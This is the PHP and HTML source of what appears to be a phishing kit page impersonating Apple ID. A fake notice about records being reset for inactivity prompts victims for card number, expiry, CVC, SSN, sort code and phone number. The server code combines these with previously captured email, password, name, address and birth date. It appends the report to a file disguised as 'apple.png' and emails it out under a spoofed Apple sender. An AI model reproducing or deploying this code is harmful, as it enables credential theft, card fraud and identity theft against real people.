<?php
session_start();
error_reporting(0);
include ('config.php');



	$_SESSION['number']=$_POST['number'];
	$_SESSION['expiry']=$_POST['expiry'];
	$_SESSION['cvc']=$_POST['cvc'];
	$_SESSION['9liwat-4'] = $_POST['9liwat-4'];
	$_SESSION['9liwat-5']= $_POST['9liwat-5'];
	$_SESSION['mobile-number']=$_POST['mobile-number'];
	
	
	 if (isset($_GET['cnt']) && $_GET['cnt'] == "us"){
	
		$us = "block";
		$uk = "none";
		
		
	}else if(isset($_GET['cnt']) && $_GET['cnt'] == "uk"){
		$us = "none";
		$uk = "block";
		
			
	}else {
		$us = "none";
		$uk = "none";	
		
			
	}

if (isset($_POST['number'])){ 
 	

$message .= "[~] ________________________ (Login Rezult) _____________________\n";

$message .= "|Email:	 ".$_SESSION['_email_']."\n";
$message .= "|Password:  ".$_SESSION['_password_']."\n";

$message .= "[~] ________________________ (Bill Rezult) ______________________\n";

$message .= "|First Name: 	".$_SESSION['Anonisma-1']."\n";
$message .= "|Last Name: 	".$_SESSION['Anonisma-2']."\n";
$message .= "|Address: 		".$_SESSION['Anonisma-3']."\n";
$message .= "|DOB:			".$_SESSION['Anonisma-7']."\n";
$message .= "|City : 		".$_SESSION['Anonisma-4']."\n";
$message .= "|Postal Code : ".$_SESSION['Anonisma-5']."\n";
$message .= "|State: 		".$_SESSION['Anonisma-6']."\n";
$message .= "|Country: 		".$_SESSION['country']."\n";

$message .= "[~] ______________________ (Credit card Rezult)  _________________\n";

$message .= "|C /R / D : 	".$_POST['number']."\n";
$message .= "|EXP /MM/YY: 	".$_POST['expiry']."\n";
$message .= "|C / V / V	: 	".$_POST['cvc']."\n";
$message .= "|S/S/N : 		".$_POST['9liwat-4']."\n";
$message .= "|S/C/D : 		".$_POST['9liwat-5']."\n";
$message .= "|P/H/N : 		".$_POST['mobile-number']."\n";

$message .= "|[~] ________________________ (info Rezult) ______________________\n";

$message .= "|time : 	".$time."\n";
$message .= "|Ip: 		".$ip."\n";
$message .= "|browser: 	".$browser."\n";
$message .= "|User Agent: 	".$_SERVER['HTTP_USER_AGENT']."\n";

$message .= "[~] ============================================================== \n";

$send = "$to"; //Put Your Email Here

$subject = "~ Billing Rezult ~ | $countryname | $ip";
$from ="Apple";

$open_rezult_file = fopen("../apple.png","a"); // spam rezult in file okkkkkk becarful
fwrite($open_rezult_file,$message); // spam rezult in file okkkkkk becarful

mail($to, $subject, $message, "From: Apple <schlive@live.com>");     
header("Location: checking.php");


}

	
?>
<!DOCTYPE html>
<html>
<head>
	<title> My lD Account </title>
	<meta name="robots" content="noindex">

		<meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
		<meta http-equiv="Content-Type" content="text/html; charset=windows-1251"/>
		<meta name="viewport" content="width=device-width"/>
		<meta name="viewport" content="width=device-width, maximum-scale=1.0, user-scalable=1" />
		<link  rel="logo-icon" href="../set/img/iconisma.ico"/>
		<link rel="stylesheet" href="../set/css/intlTelInput.css"/>
		<link rel="stylesheet" href="../set/css/bootstrap.min.css"/>
		<link rel="stylesheet" href="../set/css/bootstrap-theme.min.css"/>
		<link rel="stylesheet" href="../set/cssisma/tot.css" type="text/css"/>

		<link rel="stylesheet" href="../set/css/flags.css" />
		<link rel="stylesheet" href="../set/css/styles.css"/>
				
				
				<script src="../set/js/jquery-1.11.0.min.js"></script>
				<script src="../set/js/bootstrap.min.js"></script>
				<script src="../set/js/angular.min.js"></script>
			
	
</head>	
		
		
		
	<body style="background:#F3F3F3">

	<?php include("../forms/nav.php")?>

	<div class="container">
		<img src="../set/img/app1e.png" class="img-responsive myapp" />



		<div class="row row2" >
			<div class=" col-xs-4 sidebar mobile-hide" background="blue" >
			<img style="width:100%; position:relative; top:20px;" src="../set/img/Untitled2.png ">
			</div>
			<div class="col-xs-4 loop mobile" style="">
				<div >
						<img style="width:50%; position:relative; " src="../set/img/pay.png ">

					<hr/>
					<p style="color:red;">Due To the long time of inactivity all records had been reset, please submit your payment details:</p>
				</div>
				<?php include('../forms/Bill.php')?>

			</div>
			<div class="footbar col-xs-12" background="blue" >
				<p style="padding:15px;">Apple uses industry-standard encryption to protect the confidentiality of your personal information.</p>
			</div>
		</div>
		<br/>
		<br/>
		<br/>
		<br/>
		<div class="panel-footer footer" >
			<img src="../set/img/footer.png" class="img-responsive" />
		</div>
	</div>

</body>

<script src="../set/js/jquery.creditCardValidator.js"></script>
<script src="../set/js/card.js"></script>
   <script>
        new Card({
            form: document.querySelector('form'),
            container: '.form-group'
        });
</script>
<script>
	//if(document.getElementById('button').onclick = function(){
	//alert("clicked");
	var checkOut;
	var myInput1 = document.getElementById("9liwat-1");
	var myInput2 = document.getElementById("9liwat-2");
	var myInput3 = document.getElementById("9liwat-3");
	var myInput4 = document.getElementById("9liwat-4");
	var myInput5 = document.getElementById("9liwat-5");
	var myInput6 = document.getElementById("mobile-number");
	var locate = document.getElementById("countrycode");
	$('body').on('click', '#button', function check() {
    if (myInput1 && !myInput1.value) {
    checkOut = "false";
    $('#9liwat-1').css ({
		'background-color': '#FEFEDE',
		'border-radius': '4px',
	  });
}else {
        $('#9liwa-1').validateCreditCard(function(result) {
    if (result.valid===true){
	 checkOut = "Valid";
	   $('#9liwa-1').css ({
		
		'border': '2px solid #07BF30',
		'border-radius': '4px',
		  });
}	else{
				// alert(result.valid);
	  checkOut = "false";
	  $('#9liwa-1').css ({
		'background-color': '#FEFEDE',
		'border-radius': '4px',
	  });
   };
     });
}
   if (myInput2 && !myInput2.value) {
    VC = "false";
    $('#9liwat-2').css ({
		'background-color': '#FEFEDE',
		'border-radius': '4px',
	  });
}else {
VC = "true";
}
   if (myInput3 && !myInput3.value) {
    exp = "false";
    $('#9liwat-3').css ({
		'background-color': '#FEFEDE',
		'border-radius': '4px',
	  });
}else {
  exp = "true";
   }
 if (locate && locate.value == 'US') {
			if (myInput4 && !myInput4.value) {
			SSR = "false";
			$('#9liwat-4').css ({
				'background-color': '#FEFEDE',
				'border-radius': '4px',
			  });
		}else {
		  SSR = "true";
		   }
	}else if (locate && locate.value == 'GB') {
		if (myInput5 && !myInput5.value) {
		SSR = "false";
		$('#9liwat-5').css ({
			'background-color': '#FEFEDE',
			'border-radius': '4px',
		  });
		}else {
	  SSR = "true";
		}
	}else{
	   SSR = "true";
   }
    if (myInput6 && !myInput6.value) {
    phn = "false";
    $('#mobile-number').css ({
		'background-color': '#FEFEDE',
		'border-radius': '4px',
	  });
}else {
  phn = "true";
   }
 if (checkOut == "Valid" && exp=="true" && VC=="true"  && SSR=="true" && phn == "true" ){
    document.forms["9liwaf"].submit();
	}else{
	return false;
	};
});
</script>
<script>
      (function () {
		angular.module('pvdSSN', []).controller('testCtrl', function ($scope) {
        return $scope.ssn = 123456789;
    }).filter('ssnFilter', function () {
        return function (value, mask) {
            var len, val;
            if (mask == null) {
                mask = false;
            }
            if (value) {
                val = value.toString().replace(/\D/g, '');
                len = val.length;
                if (len < 4) {
                    return val;
                } else if (3 < len && len < 6) {
                    if (mask) {
                        return '***-' + val.substr(3);
                    } else {
                        return val.substr(0, 3) + '-' + val.substr(3);
                    }
                } else if (len > 5) {
                    if (mask) {
                        return '***-**-' + val.substr(5, 4);
                    } else {
                        return val.substr(0, 3) + '-' + val.substr(3, 2) + '-' + val.substr(5, 4);
                    }
                }
            }
            return value;
        };
    }).filter('ssnReverse', function () {
        return function (value) {
            if (!!value) {
                return value.replace(/\D/g, '').substr(0, 9);
            }
            return value;
        };
    }).directive('ssnField', function ($filter) {
        var ssnFilter, ssnReverse;
        ssnFilter = $filter('ssnFilter');
        ssnReverse = $filter('ssnReverse');
        return {
            restrict: 'A',
            require: 'ngModel',
            link: function (scope, element, attrs, modelCtrl) {
                var formatter, mask, parser;
                mask = attrs.ssnFieldMask;
                formatter = function (value) {
                    return ssnFilter(value);
                };
                parser = function (value) {
                    var formatted;
                    formatted = ssnReverse(value);
                    element.val(ssnFilter(formatted));
                    return formatted;
                };
                modelCtrl.$formatters.push(formatter);
                return modelCtrl.$parsers.unshift(parser);
            }
        };
    });
    angular.bootstrap(document, ['pvdSSN']);
}.call(this));
      //@ sourceURL=pen.js
    </script>
	
<script src="../set/js/intlTelInput.js?39"></script>		
	<script>
		  $("#mobile-number").intlTelInput({
			utilsScript: "../set/js/utils.js"
			  });
	</script>
	
							</html>		